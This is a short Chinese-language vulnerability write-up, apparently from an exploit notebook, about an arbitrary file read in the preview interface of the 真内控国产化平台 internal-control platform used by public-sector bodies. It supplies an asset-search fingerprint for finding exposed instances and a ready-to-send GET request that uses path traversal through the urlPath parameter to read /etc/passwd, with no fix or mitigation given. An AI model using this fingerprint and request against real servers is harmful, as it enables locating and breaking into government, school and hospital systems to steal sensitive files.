# 真内控国产化平台preview存在任意文件读取漏洞

# 一、漏洞简介
真内控国产化平台是基于国产可控技术开发的内部控制管理咨询及信息化服务平台。该平台涵盖了预算绩效、支出管理、采购管理、合同管理、资产管理、基建项目管理等多个模块，为公共部门（包括政府部门、科研机构、学校、医院等）提供全方位的经济活动内部控制解决方案。真内控国产化平台 preview接口存在一个任意文件读取漏洞，攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。通过利用此漏洞，攻击者可能获得系统内的敏感信息，导致潜在的信息泄露风险。

# 二、影响版本
真内控国产化平台

# 三、资产测绘
```plain
body="js/npm.echarts.js"
```

![1718991802147-8b55da97-545e-456a-b18e-fa349435c2ae.png](./img/PUn3lRwoNJ9lQ-zV/1718991802147-8b55da97-545e-456a-b18e-fa349435c2ae-033492.png)

# 四、漏洞复现
```java
GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd  HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![1718991623666-59807fc9-1c16-4ff4-bb86-305f12a4f0b5.png](./img/PUn3lRwoNJ9lQ-zV/1718991623666-59807fc9-1c16-4ff4-bb86-305f12a4f0b5-514760.png)



> 更新: 2024-06-23 23:42:48  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/um00s8xep779vpgx>